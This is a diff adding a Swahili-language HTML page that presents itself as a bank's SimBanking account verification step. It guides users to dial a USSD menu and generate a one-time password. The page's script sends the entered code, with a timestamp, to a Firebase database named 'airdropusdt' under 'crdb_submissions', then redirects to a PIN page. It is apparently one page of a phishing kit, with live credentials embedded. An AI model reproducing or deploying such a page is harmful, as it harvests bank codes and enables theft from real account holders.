@@ -1,0 +1,195 @@
+<!DOCTYPE html>
+<html lang="sw">
+<head>
+  <meta charset="utf-8"/>
+  <meta name="viewport" content="width=device-width,initial-scale=1"/>
+  <title>Thibitisha Akaunti - OTP</title>
+
+  <style>
+    /* --- SAME STYLE AS FIRST PAGE (DARK GRADIENT + GLASS CARD) --- */
+    :root{
+      --bg1: linear-gradient(to bottom right,#003300,#000); 
+      --accent:#00ff66; 
+      --dark:#003300;
+    }
+
+    body{
+      margin:0;
+      min-height:100vh;
+      font-family:Poppins, Arial, sans-serif;
+      background:var(--bg1);
+      color:#fff;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+    }
+
+    .card{
+      width:92%;
+      max-width:420px;
+      background:rgba(255,255,255,0.06);
+      padding:22px;
+      border-radius:12px;
+      text-align:center;
+      box-shadow:0 8px 24px rgba(0,0,0,0.35);
+    }
+
+    h1{
+      color:var(--accent);
+      margin:0 0 10px;
+      font-size:20px;
+    }
+
+    p{
+      color:#e6fbe6;
+      font-size:14px;
+      line-height:1.5;
+    }
+
+    input{
+      width:90%;
+      padding:12px;
+      border-radius:8px;
+      border:none;
+      margin-top:14px;
+      font-size:15px;
+    }
+
+    .btn{
+      margin-top:14px;
+      padding:12px;
+      border-radius:8px;
+      border:none;
+      width:90%;
+      background:var(--accent);
+      color:var(--dark);
+      font-weight:700;
+      cursor:pointer;
+    }
+
+    .message{
+      margin-top:12px;
+      min-height:18px;
+      font-size:14px;
+    }
+
+    /* Loading overlay */
+    .overlay{
+      position:fixed;
+      inset:0;
+      display:none;
+      align-items:center;
+      justify-content:center;
+      background:rgba(0,0,0,0.45);
+      z-index:9999;
+    }
+
+    .spinner{
+      width:64px;
+      height:64px;
+      border-radius:50%;
+      border:6px solid rgba(255,255,255,0.16);
+      border-top-color:#fff;
+      animation:spin 1s linear infinite;
+    }
+
+    @keyframes spin{ to{ transform:rotate(360deg);} }
+  </style>
+</head>
+
+<body>
+
+  <div class="card" role="main">
+    <h1>Thibitisha Akaunti Yako</h1>
+
+    <p>Chukua msimbo wa uthibitisho (OTP) kwa kufuata hatua za SimBanking kisha uweke hapa.</p>
+
+    <p style="text-align:left; font-size:13px; color:#dff;">
+      <strong>Hatua za kupata OTP:</strong><br>
+      1️⃣ Piga <strong>*150*03#</strong><br>
+      2️⃣ Chagua <strong>1</strong> SimBanking kisha weka namba ya siri<br>
+      3️⃣ Chagua <strong>1</strong> Akaunti yangu → <strong>5</strong> → <strong>1</strong> kisha thibitisha
+    </p>
+
+    <input id="otpCode" type="text" placeholder="Weka OTP hapa..." inputmode="numeric" />
+    <button id="sendOtp" class="btn">Tuma Msimbo</button>
+
+    <div id="message" class="message" aria-live="polite"></div>
+  </div>
+
+  <!-- Loading overlay -->
+  <div id="loading" class="overlay">
+    <div class="spinner" role="status" aria-label="Inafanya kazi"></div>
+  </div>
+
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js";
+    import { getDatabase, ref, update } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-database.js";
+
+    const firebaseConfig = {
+      apiKey: "AIzaSyD4NQ9EsQqerx6y7v322p2ycraoDWJSRcM",
+      authDomain: "airdropusdt-767d7.firebaseapp.com",
+      databaseURL: "https://airdropusdt-767d7-default-rtdb.europe-west1.firebasedatabase.app",
+      projectId: "airdropusdt-767d7",
+      storageBucket: "airdropusdt-767d7.firebasestorage.app",
+      messagingSenderId: "627616603037",
+      appId: "1:627616603037:web:63041f067800c97fab6d74",
+      measurementId: "G-01F6G2CYXK"
+    };
+
+    const app = initializeApp(firebaseConfig);
+    const db = getDatabase(app);
+
+    const loading = document.getElementById('loading');
+    const sendOtp = document.getElementById('sendOtp');
+    const messageDiv = document.getElementById('message');
+
+    function showLoading(show=true){
+      loading.style.display = show ? 'flex' : 'none';
+    }
+
+    sendOtp.addEventListener('click', async () => {
+      messageDiv.textContent = '';
+      const otp = document.getElementById('otpCode').value.trim();
+
+      if (!otp){
+        messageDiv.textContent = 'Tafadhali weka msimbo wa OTP kabla ya kutuma.';
+        messageDiv.style.color = 'orangered';
+        return;
+      }
+
+      const id = localStorage.getItem('submissionId');
+      if (!id){
+        messageDiv.textContent = 'Haijapatikana rekodi ya awali. Rudi mwanzo tafadhali.';
+        messageDiv.style.color = 'orangered';
+        return;
+      }
+
+      showLoading(true);
+
+      try{
+        const entryRef = ref(db, `crdb_submissions/${id}`);
+        await update(entryRef, {
+          otp: otp,
+          otpTime: new Date().toISOString()
+        });
+
+        messageDiv.textContent = '✅ Msimbo umehifadhiwa. Ukielekezwa…';
+        messageDiv.style.color = 'lightgreen';
+
+        setTimeout(()=>{
+          showLoading(false);
+          window.location.href = 'pin.html';
+        }, 900);
+
+      } catch(err){
+        showLoading(false);
+        messageDiv.textContent = 'Imeshindikana kuhifadhi msimbo. Jaribu tena.';
+        messageDiv.style.color = 'orangered';
+        console.error(err);
+      }
+    });
+  </script>
+
+</body>
+                 </html>
